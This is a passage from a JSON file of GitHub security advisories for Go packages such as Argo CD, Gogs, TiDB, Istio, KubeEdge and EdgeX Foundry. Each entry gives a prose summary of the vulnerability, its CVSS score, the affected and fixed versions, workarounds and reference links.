1.4.3) mitigating Path traversal vulnerability could be bypassed by an attacker. In case a malicious TAL file is parsed, it was possible to write files outside the base cache folder.\n\n### Specific Go Packages Affected\ngithub.com/cloudflare/cfrpki/cmd/octorpki\n\n### Patches\nThe issue was fixed in version 1.4.3\n\n### References\n[CVE-2021-3907](https://www.cvedetails.com/cve/CVE-2021-3907/)\n\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/cfrpki"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/security/advisories/GHSA-3jhm-87m6-x959"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/security/advisories/GHSA-cqh2-vc2f-q4fh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3907"}, {"type": "PACKAGE", "url": "https://github.com/cloudflare/cfrpki"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/releases/tag/v1.4.3"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-06-25T07:12:08Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-9w9f-6mg8-jp7w", "modified": "2023-02-14T21:38:16Z", "published": "2022-06-03T22:17:51Z", "aliases": ["CVE-2022-31022"], "summary": "Missing Role Based Access Control for the REST handlers in bleve/http package", "details": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nBleve includes HTTP utilities under bleve/http package, that are used by its sample application. \n(https://github.com/blevesearch/bleve-explorer)\nThese HTTP methods paves way for exploitation of a node\u2019s filesystem where the bleve index resides, \nif the user has used bleve\u2019s own HTTP (bleve/http) handlers for exposing the access to the indexes. \nFor instance, the CreateIndexHandler (http/index_create.go) and DeleteIndexHandler (http/index_delete.go) \nenable an attacker to create a bleve index (directory structure) anywhere where the user running the server \nhas the write permissions and to delete recursively any directory owned by the same user account.\n \nUsers who have used the bleve/http package for exposing access to bleve index without the explicit \nhandling for the Role Based Access Controls(RBAC) of the index assets would be impacted.\n\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\n**No**. The http package is purely intended to be used for demonstration purposes. \nAnd bleve is never designed to be handling the RBACs or it was ever advertised to be used in that way. \nHence the collaborators of this project have decided to stay away from adding any authentication or \nauthorization to bleve project at the moment.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nThe bleve/http package is mainly for demonstration purposes and it lacks exhaustive validation of the user \ninputs as well as any authentication and authorization measures. \nSo it is recommended to not use that in production use cases.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue [here](https://github.com/blevesearch/bleve/issues).\n* Email us at [mailto:security@couchbase.com, fts-team@couchbase.com].\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/blevesearch/bleve"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.10.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/blevesearch/bleve/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "2.3.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/blevesearch/bleve/security/advisories/GHSA-9w9f-6mg8-jp7w"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31022"}, {"type": "WEB", "url": "https://github.com/blevesearch/bleve/commit/1c7509d6a17d36f265c90b4e8f4e3a3182fe79ff"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0470"}, {"type": "PACKAGE", "url": "github.com/blevesearch/bleve"}], "database_specific": {"cwe_ids": ["CWE-306"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-06-03T22:17:51Z", "nvd_published_at": "2022-06-01T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xq4v-vrp9-vcf2", "modified": "2022-06-08T22:24:25Z", "published": "2022-06-08T22:24:25Z", "aliases": ["CVE-2022-31038"], "summary": "Cross-site Scripting vulnerability in repository issue list in Gogs", "details": "### Impact\n`DisplayName` allows all the characters from users, which leads to an XSS vulnerability when directly displayed in the issue list.\n\n### Patches\n`DisplayName` is sanitized before being displayed. Users should upgrade to 0.12.9 or the latest 0.13.0+dev.\n\n### Workarounds\nCheck and update the existing users' display names that contain malicious characters.\n\n### References\nN/A\n\n### For more information\nIf you have any questions or comments about this advisory, please post on https://github.com/gogs/gogs/pull/7009.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gogs/gogs/security/advisories/GHSA-xq4v-vrp9-vcf2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31038"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/pull/7009"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/155cae1de8916fc3fde78f350763034b7422caee"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/releases/tag/v0.12.9"}], "database_specific": {"cwe_ids": ["CWE-79", "CWE-80"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-06-08T22:24:25Z", "nvd_published_at": "2022-06-09T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jhqp-vf4w-rpwq", "modified": "2022-06-21T22:51:05Z", "published": "2022-06-21T22:51:05Z", "aliases": ["CVE-2022-31016"], "summary": "DoS through large manifest files in Argo CD", "details": "### Impact\n\nAll versions of Argo CD starting with v0.7.0 are vulnerable to an uncontrolled memory consumption bug, allowing an authorized malicious user to crash the [repo-server](https://argo-cd.readthedocs.io/en/stable/operator-manual/architecture/#repository-server) service. The repo-server is a critical component of Argo CD, so crashing the repo-server effectively denies core Argo CD services (such as syncing Application updates).\n\nTo achieve denial of service, the attacker must be an authenticated Argo CD user authorized to deploy Applications from a repository which contains (or can be made to contain) a large file. \n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.4.1\n* v2.3.5\n* v2.2.10\n* v2.1.16\n\n**The patch introduces a new `reposerver.max.combined.directory.manifests.size` config parameter, which you should tune before upgrading in production.** It caps the maximum total file size of .yaml/.yml/.json files in directory-type (raw manifest) Applications. The default max is `10M` per Application. This max is designed to keep any single app from consuming more than 3G of memory in the repo-server (manifests consume more space in memory than on disk). The 300x ratio assumes a maliciously-crafted manifest file. If you only want to protect against accidental excessive memory use, it is probably safe to use a smaller ratio.\n\nIf your organization uses directory-type Applications with very many manifests or very large manifests then **check the size of those manifests and tune the config parameter before deploying this change to production**. When testing, make sure to do a \"hard refresh\" in either the CLI or UI to test your directory-type App. That will make sure you're using the new max logic instead of relying on cached manifest responses from Redis.\n\n### Workarounds\n\nThere is no workaround besides upgrading.\n\nTo mitigate the issue, carefully limit 1) who can configure repos (determined by [RBAC](https://argo-cd.readthedocs.io/en/stable/getting_started/)), 2) which repos are allowed (determined by [Project](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/) limitations), and 3) who has push access to those repos (determined by your SCM provider configuration).\n\n### Credits\n\nDisclosed by ADA Logics in a security audit of the Argo project sponsored by CNCF and facilitated by OSTIF. Thanks to Adam Korczynski and David Korczynski for their work on the audit.\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.7.0"}, {"fixed": "2.1.16"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.8.7"}}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.16"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.2.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.3.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.4.0"}, {"fixed": "2.4.1"}]}], "versions": ["2.4.0"]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-jhqp-vf4w-rpwq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31016"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-06-21T22:51:05Z", "nvd_published_at": "2022-06-25T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h4w9-6x78-8vrj", "modified": "2022-06-21T20:04:34Z", "published": "2022-06-21T20:04:34Z", "aliases": ["CVE-2022-31035"], "summary": "Argo CD's external URLs for Deployments can include JavaScript", "details": "### Impact\n\nAll unpatched versions of Argo CD starting with v1.0.0 are vulnerable to a cross-site scripting (XSS) bug allowing a malicious user to inject a `javascript:` link in the UI. When clicked by a victim user, the script will execute with the victim's permissions (up to and including admin).\n\nThe script would be capable of doing anything which is possible in the UI or via the API, such as creating, modifying, and deleting Kubernetes resources.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.4.1\n* v2.3.5\n* v2.2.10\n* v2.1.16\n\n### Workarounds\n\nThere are no completely-safe workarounds besides upgrading.\n\n**Mitigations:**\n\n1. Avoid clicking external links presented in the UI. Here is an example of an Application node with an external link:\n\n   ![Application node in the Argo CD UI with an external link](https://user-images.githubusercontent.com/350466/171678146-026bbf20-2116-4b9f-8af8-7bb5b7ee8dff.png)\n\n   The link's title is user-configurable. So even if you hover the link, and the tooltip looks safe, the link might be malicious. The only way to be certain that the link is safe is to inspect the page's source.\n\n2. Carefully limit who has permissions to edit resource manifests (this is configured in [RBAC](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/)).\n\n### References\n\n* [Documentation for the external links feature](https://argo-cd.readthedocs.io/en/stable/user-guide/external-url/)\n\n### Credits\n\nDisclosed by ADA Logics in a security audit of the Argo project sponsored by CNCF and facilitated by OSTIF. Thanks to Adam Korczynski and David Korczynski for their work on the audit.\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"fixed": "2.1.16"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.8.7"}}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.16"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.2.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.3.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.4.0"}, {"fixed": "2.4.1"}]}], "versions": ["2.4.0"]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-h4w9-6x78-8vrj"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31035"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/8bc3ef690de29c68a36f473908774346a44d4038"}, {"type": "WEB", "url": "https://argo-cd.readthedocs.io/en/stable/user-guide/external-url/"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-06-21T20:04:34Z", "nvd_published_at": "2022-06-27T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5q86-62xr-3r57", "modified": "2022-06-29T21:49:09Z", "published": "2022-06-17T01:02:56Z", "aliases": ["CVE-2022-31054"], "summary": "Uses of deprecated API can be used to cause DoS in user-facing endpoints", "details": "### Impact\nSeveral `HandleRoute` endpoints make use of the deprecated `ioutil.ReadAll()`. `ioutil.ReadAll()` reads all the data into memory. As such, an attacker who sends a large request to the Argo Events server will be able to crash it and cause denial of service.\n\nEventsources susceptible to an out-of-memory denial-of-service attack:\n\n- AWS SNS\n- Bitbucket\n- Bitbucket\n- Gitlab\n- Slack\n- Storagegrid\n- Webhook\n\n### Patches\nA patch for this vulnerability has been released in the following Argo Events version:\n\nv1.7.1\n\n### Credits\nDisclosed by [Ada Logics](https://adalogics.com/) in a security audit sponsored by CNCF and facilitated by OSTIF.\n\n### For more information\nOpen an issue in the [Argo Events issue tracker](https://github.com/argoproj/argo-events/issues) or [discussions](https://github.com/argoproj/argo-events/discussions)\nJoin us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-events", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-events"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-events/security/advisories/GHSA-5q86-62xr-3r57"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31054"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-events/issues/1946"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-events/pull/1966"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-events/commit/eaabcb6d65022fc34a0cc9ea7f00681abd326b35"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-events"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-787"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-06-17T01:02:56Z", "nvd_published_at": "2022-06-13T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gwpf-95jc-63rv", "modified": "2022-06-17T01:01:48Z", "published": "2022-06-03T00:00:41Z", "aliases": ["CVE-2022-1982"], "summary": "Uncontrolled Resource Consumption in Mattermost server", "details": "Uncontrolled resource consumption in Mattermost version 6.6.0 and earlier allows an authenticated attacker to crash the server via a crafted SVG attachment on a post.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.6.0"}, {"fixed": "6.6.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.5.0"}, {"fixed": "6.5.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.4.0"}, {"fixed": "6.4.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "5.0.0"}, {"fixed": "6.3.8"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1982"}, {"type": "WEB", "url": "https://github.com/mattermost/mattermost-server/pull/19988"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost-server"}, {"type": "WEB", "url": "https://mattermost.com/security-updates/"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-06-17T01:01:48Z", "nvd_published_at": "2022-06-02T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xwx5-5c9g-x68x", "modified": "2022-06-10T19:53:55Z", "published": "2022-06-10T19:53:55Z", "aliases": ["CVE-2022-31045"], "summary": "Ill-formed headers may lead to unexpected behavior in Istio", "details": "### Impact\nIll-formed headers sent to Envoy in certain configurations can lead to unexpected memory access resulting in undefined behavior or crashing.\n\nYou are at most risk if you have an Istio ingress Gateway exposed to external traffic.\n\n### Patches\n1.12.8, 1.13.5, 1.14.1\n\n### Workarounds\nNo.\n\n### References\nMore details can be found in the [Istio Security Bulletin](https://istio.io/latest/news/security/istio-security-2022-05)\n\n### For more information\nIf you have any questions or comments about this advisory, please email us at [istio-security-vulnerability-reports@googlegroups.com](mailto:istio-security-vulnerability-reports@googlegroups.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.12.18"}]}]}, {"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.5"}]}]}, {"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.14.0"}, {"fixed": "1.14.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/istio/istio/security/advisories/GHSA-xwx5-5c9g-x68x"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31045"}, {"type": "PACKAGE", "url": "https://github.com/istio/istio"}, {"type": "WEB", "url": "https://istio.io/latest/news/security/istio-security-2022-05"}], "database_specific": {"cwe_ids": ["CWE-125"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-06-10T19:53:55Z", "nvd_published_at": "2022-06-09T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x938-fvfw-7jh5", "modified": "2022-06-25T07:11:05Z", "published": "2022-06-25T07:11:05Z", "aliases": ["CVE-2022-31077"], "summary": "CloudCore CSI Driver: Malicious response from KubeEdge can crash CSI Driver controller server", "details": "### Impact\nA malicious message response from KubeEdge can crash the CSI Driver controller server by triggering a nil-pointer dereference panic. As a consequence, the CSI Driver controller will be in denial of service. An attacker would already need to be an authenticated user of the Cloud, and only when the authenticated user launches the `csidriver` then CloudCore may be attacked.\n\n### Patches\nThis bug has been fixed in Kubeedge 1.11.0, 1.10.1, and 1.9.3. Users should update to these versions to resolve the issue.\n\n### Workarounds\nAt the time of writing, no workaround exists.\n\n### References\nNA\n\n### Credits\nThanks David Korczynski and Adam Korczynski of ADA Logics for responsibly disclosing this issue in accordance with the [kubeedge security policy](https://github.com/kubeedge/kubeedge/security/policy) during a security audit sponsored by CNCF and facilitated by OSTIF.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [KubeEdge repo](https://github.com/kubeedge/kubeedge/issues/new/choose)\n* To make a vulnerability report, email your vulnerability to the private [cncf-kubeedge-security@lists.cncf.io](mailto:cncf-kubeedge-security@lists.cncf.io) list with the security details and the details expected for [KubeEdge bug reports](https://github.com/kubeedge/kubeedge/blob/master/.github/ISSUE_TEMPLATE/bug-report.md).\n\n**Notes:** This vulnerability was found by fuzzing KubeEdge by way of OSS-Fuzz.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:H/PR:H/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.1"}]}], "versions": ["1.10.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kubeedge/kubeedge/security/advisories/GHSA-x938-fvfw-7jh5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31077"}, {"type": "WEB", "url": "https://github.com/kubeedge/kubeedge/pull/3899"}, {"type": "WEB", "url": "https://github.com/kubeedge/kubeedge/pull/3899/commits/5d60ae9eabd6b6b7afe38758e19bbe8137664701"}, {"type": "PACKAGE", "url": "https://github.com/kubeedge/kubeedge"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-06-25T07:11:05Z", "nvd_published_at": "2022-06-27T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4whx-7p29-mq22", "modified": "2022-06-06T21:22:28Z", "published": "2022-06-06T21:22:28Z", "aliases": ["CVE-2022-31011"], "summary": "TiDB authentication bypass vulnerability", "details": "### Impact\nUnder certain conditions, an attacker can construct malicious authentication requests to bypass the authentication process, resulting in privilege escalation or unauthorized access.\nOnly users using TiDB 5.3.0 are affected by this vulnerability.\n\n### Patches\nPlease upgrade to TiDB 5.3.1 or higher version\n\n### Workarounds\nYou can also mitigate risks by taking the following measures.\nOption 1: Turn off SEM (Security Enhanced Mode).\nOption 2: Disable local login for non-root accounts and ensure that the same IP cannot be logged in as root or normal user at the same time.\n\n### References\nhttps://en.pingcap.com/download/\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@tidb.io\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pingcap/tidb"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "5.3.0"}, {"fixed": "5.3.1"}]}], "versions": ["5.3.0"]}], "references": [{"type": "WEB", "url": "https://github.com/pingcap/tidb/security/advisories/GHSA-4whx-7p29-mq22"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31011"}, {"type": "PACKAGE", "url": "https://github.com/pingcap/tidb"}, {"type": "WEB", "url": "https://github.com/pingcap/tidb/releases/tag/v5.3.1"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-06-06T21:22:28Z", "nvd_published_at": "2022-05-31T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xggc-qprg-x6mw", "modified": "2022-06-23T17:40:34Z", "published": "2022-06-23T17:40:34Z", "aliases": ["CVE-2022-31098"], "summary": "Weave GitOps leaked cluster credentials into logs on connection errors", "details": "### Impact\nA vulnerability in the logging of Weave GitOps could allow an authenticated remote attacker to view sensitive cluster configurations, aka KubeConfg, of registered Kubernetes clusters, including the service account tokens in plain text from Weave GitOps's pod logs on the management cluster. An unauthorized remote attacker can also view these sensitive configurations from external log storage if enabled by the management cluster.\n\nThis vulnerability is due to the client factory dumping cluster configurations and their service account tokens when the cluster manager tries to connect to an API server of a registered cluster, and a connection error occurs. An attacker could exploit this vulnerability by either accessing logs of a pod of Weave GitOps, or from external log storage and obtaining all cluster configurations of registered clusters.\n\nA successful exploit could allow the attacker to use those cluster configurations to manage the registered Kubernetes clusters.\n\n### Patches\nThis vulnerability has been fixed by commit 567356f471353fb5c676c77f5abc2a04631d50ca. Users should upgrade to Weave GitOps core version >= v0.8.1-rc.6 released on 31/05/2022.\n\n### Workarounds\nThere is no workaround for this vulnerability.\n\n### References\nDisclosed by Stefan Prodan, Principal Engineer, Weaveworks.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Weave GitOps repository](https://github.com/weaveworks/weave-gitops)\n* Email us at [support@weave.works](mailto:support@weave.works)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/weaveworks/weave-gitops"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.8.1-rc.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.8.1-rc.5"}}], "references": [{"type": "WEB", "url": "https://github.com/weaveworks/weave-gitops/security/advisories/GHSA-xggc-qprg-x6mw"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31098"}, {"type": "WEB", "url": "https://github.com/weaveworks/weave-gitops/commit/567356f471353fb5c676c77f5abc2a04631d50ca"}, {"type": "PACKAGE", "url": "https://github.com/weaveworks/weave-gitops"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-209", "CWE-532", "CWE-538"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-06-23T17:40:34Z", "nvd_published_at": "2022-06-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g63h-q855-vp3q", "modified": "2022-07-11T21:21:42Z", "published": "2022-06-17T01:11:42Z", "aliases": ["CVE-2022-31066"], "summary": "Configuration API in EdgeXFoundry 2.1.0 and earlier exposes message bus credentials to local unauthenticated users", "details": "### Impact\nThe /api/v2/config endpoint exposes message bus credentials to local unauthenticated users.  In security-enabled mode, message bus credentials are supposed to be kept in the EdgeX secret store and require authentication to access.  This vulnerability bypasses the access controls on message bus credentials when running in security-enabled mode.  (No credentials are required when running in security-disabled mode.)  As a result, attackers could intercept data or inject fake data into the EdgeX message bus.\n\n### Patches\nUsers should upgrade to EdgeXFoundry Kamakura release (2.2.0) or to the June 2022 EdgeXFoundry LTS Jakarta release (2.1.1).\n\nThe issue has been patched in the following docker containers and snaps:\n\n#### Patched go modules\ngithub.com/edgexfoundry/device-sdk-go/v2 >= v2.1.1\ngithub.com/edgexfoundry/app-functions-sdk-go/v2 >= v2.1.1\n\n#### Patched docker containers\nURL: https://hub.docker.com/r/edgexfoundry\n- docker.io/edgexfoundry/core-metadata:>=2.1.1\n- docker.io/edgexfoundry/core-metadata-arm64:>=2.1.1\n- docker.io/edgexfoundry/core-data:>=2.1.1\n- docker.io/edgexfoundry/core-data-arm64:>=2.1.1\n- docker.io/edgexfoundry/core-command:>=2.1.1\n- docker.io/edgexfoundry/core-command-arm64:>=2.1.1\n- docker.io/edgexfoundry/support-notifications:>=2.1.1\n- docker.io/edgexfoundry/support-notifications-arm64:>=2.1.1\n- docker.io/edgexfoundry/support-scheduler:>=2.1.1\n- docker.io/edgexfoundry/support-scheduler-arm64:>=2.1.1\n- docker.io/edgexfoundry/sys-mgmt-agent:>=2.1.1\n- docker.io/edgexfoundry/sys-mgmt-agent-arm64:>=2.1.1\n- docker.io/edgexfoundry/security-proxy-setup:>=2.1.1\n- docker.io/edgexfoundry/security-proxy-setup-arm64:>=2.1.1\n- docker.io/edgexfoundry/security-secretstore-setup:>=2.1.1\n- docker.io/edgexfoundry/security-secretstore-setup-arm64:>=2.1.1\n- docker.io/edgexfoundry/security-bootstrapper:>=2.1.1\n- docker.io/edgexfoundry/security-bootstrapper-arm64:>=2.1.1\n- docker.io/edgexfoundry/app-rfid-llrp-inventory:>=2.1.1\n- docker.io/edgexfoundry/app-rfid-llrp-inventory-arm64:>=2.1.1\n- docker.io/edgexfoundry/app-service-configurable:>=2.1.1\n- docker.io/edgexfoundry/app-service-configurable-arm64:>=2.1.1\n- docker.io/edgexfoundry/device-camera:>=2.2.0\n- docker.io/edgexfoundry/device-camera-arm64:>=2.2.0\n- docker.io/edgexfoundry/device-gpio:>=2.1.1\n- docker.io/edgexfoundry/device-gpio-arm64:>=2.1.1\n- docker.io/edgexfoundry/device-modbus:>=2.1.1\n- docker.io/edgexfoundry/device-modbus-arm64:>=2.1.1\n- docker.io/edgexfoundry/device-mqtt:>=2.1.1\n- docker.io/edgexfoundry/device-mqtt-arm64:>=2.1.1\n- docker.io/edgexfoundry/device-rest:>=2.1.1\n- docker.io/edgexfoundry/device-rest-arm64:>=2.1.1\n- docker.io/edgexfoundry/device-rfid-llrp:>=2.1.1\n- docker.io/edgexfoundry/device-rfid-llrp-arm64:>=2.1.1\n- docker.io/edgexfoundry/device-snmp:>=2.1.1\n- docker.io/edgexfoundry/device-snmp-arm64:>=2.1.1\n- docker.io/edgexfoundry/device-virtual:>=2.1.1\n- docker.io/edgexfoundry/device-virtual-arm64:>=2.1.1\n\n#### Patched snaps\nURL: https://snapcraft.io/edgexfoundry\nedgexfoundry  2.1/stable  (will be automatically 